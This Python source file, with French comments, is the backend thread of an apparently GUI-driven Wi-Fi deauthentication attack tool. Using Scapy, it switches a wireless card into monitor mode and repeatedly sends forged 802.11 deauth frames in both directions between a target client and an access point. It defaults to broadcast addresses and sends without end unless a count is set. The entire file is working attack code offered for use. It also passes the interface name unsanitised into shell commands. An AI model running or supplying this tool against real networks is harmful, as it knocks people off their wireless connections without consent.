import time
import random
import threading
from scapy.all import *
import kick_deauth_graphique
import sys
import os

class kick_deauth(threading.Thread):

	
	#def __init__:
	#	self.stop=False

	def __init__(self,mac_dst,mac_ap,cannal_ap,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
		#self.stopper.set(True)
		
		#tcp_syn_graphique_2.verrou=threading.Lock()
		

		
			
		#if(tcp_syn_graphique_2.test_fenetre.check_verrou()):	
		#	print("\n ERREUR ATTAQUE EN COURS DETECTEE")
		#	sys.exit(1)	
		#else:
		#	print("\n AUCUNE ATTAQUE EN COURS DETECTEE")
		#	tcp_syn_graphique_2.edit_verrou(True)	
				
		
		#self.arret=True
		#self._stopevent=threading.Event()
		##TEST DE L'ADRESSE IP SOURCE
				

		if(mac_dst == ""):
			self.mac_dst="ff:ff:ff:ff:ff:ff"
		else:
			self.mac_dst=mac_dst

		if(mac_ap == ""):
			self.mac_ap="ff:ff:ff:ff:ff:ff"
		else:
			self.mac_ap=mac_ap
	
		if(cannal_ap != ""):
			self.cannal=int(cannal_ap)
		else:
			self.cannal="1"
		
		##TEST DE L'INTERFACE D'ENVOI
		

		if(interface != ""):
			print("interface non choisie automatiquement")
			conf.iface=interface
			self.iface=interface
		#else:
			#conf.iface="wlan0"
			#self.iface="wlan0"
			#print("interface choisie automatiquement")
		print("interface="+interface)
		
		print ("conf.iface="+conf.iface)
		

		if(interface != ""):
			print("INTERFACE D'ENVOI DES PAQUETS:"+interface)
		else:
			print("INTERFACE D'ENVOI DES PAQUETS:"+conf.iface)


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)

		#print("ip spoure="+self.ip.src)
		#print("port spoure="+str(self.p1)+"-"+str(self.p2))
		#print("ip destination="+str(self.ip.dst))
		#print("port destination="+str(port_dst))

	def run(self):	
		
		print("etat du verrou="+str(kick_deauth_graphique.verrou.locked()))
		if(kick_deauth_graphique.verrou.locked()):
			print("\n ERREUR ATTAQUE EN COURS DETECTEE")
			#sys.exit(1)
		else:
			print("\n AUCUNE ATTAQUE EN COURS DETECTEE\n")

			kick_deauth_graphique.verrou.acquire()

			

			#print("ip spoure="+self.ip.src)
			#print("port spoure="+str(self.p1)+"-"+str(self.p2))
			#print("ip destination="+str(self.ip.dst))
			#print("port destination="+str(self.portdst))		
		
			time.sleep(3)
			print("\n Lancement de l'attaque de DEAUTHENTIFICATION --"+time.ctime()+"\n")
			nbre=0
			#self.arret=False
			if(self.n == -1):
				while(1==1 and not(self.stopper.isSet())):
					os.system("ifconfig "+self.iface+" down")
					os.system("iwconfig "+self.iface+" mode monitor")
					
					os.system("ifconfig "+self.iface+" up")

					if(self.cannal!=""):
						os.system("iwconfig "+self.iface+" channel "+str(self.cannal))

					packet = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_dst,addr2=self.mac_ap,addr3=self.mac_ap)/Dot11Deauth(reason=4) #DE L'AP AU CLIENT
					packet1=RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_ap,addr2=self.mac_dst,addr3=self.mac_ap)/Dot11Deauth(reason=4) #DU CLIENT VERS L'AP		
					sendp(packet)
					sendp(packet1)
					time.sleep(self.delai)
					nbre=nbre+1


				#print("Fin des Traitements, arret de l'attaque"+time.ctime()+"\n")
				#print("arret="+str(self.arret))
				print("nombre de paquets="+str(nbre))
				if(not self.stopper.isSet()):
					print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
				else:
					print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")
			else:
				i=0
				for i in range(0,self.n):
					os.system("ifconfig "+self.iface+" down")
					os.system("iwconfig "+self.iface+" mode monitor")
					
					os.system("ifconfig "+self.iface+" up")

					if(self.cannal!=""):
						os.system("iwconfig "+self.iface+" channel "+str(self.cannal))
					#DE L'AP AU CLIENT

					packet1 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_dst,addr2=self.mac_ap,addr3=self.mac_ap)/Dot11Deauth(reason=7)
					#DU CLIENT VERS L'AP					
					packet2 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_ap,addr2=self.mac_dst,addr3=self.mac_ap)/Dot11Deauth(reason=7)
					sendp(packet1)
					sendp(packet2)
					time.sleep(self.delai)
					nbre=nbre+1
					if(self.stopper.isSet()):
						break
				#print("arret="+str(self.arret))
				#print("Fin des Traitements, arret de l'attaque")
				print("nombre de paquets="+str(nbre))
				if(not self.stopper.isSet()):
					print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
				else:
					print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")

			
			os.system("ifconfig "+self.iface+" down")
			os.system("iwconfig "+self.iface+" mode managed")
					
			os.system("ifconfig "+self.iface+" up")
			kick_deauth_graphique.verrou.release()
				#tcp_syn_graphique_2.edit_verrou(False)


	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		#self.arret=True
		self.stopper.set()
		#print(self.arret)
		#print(self.stopper.set())
	
	def randommac():
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
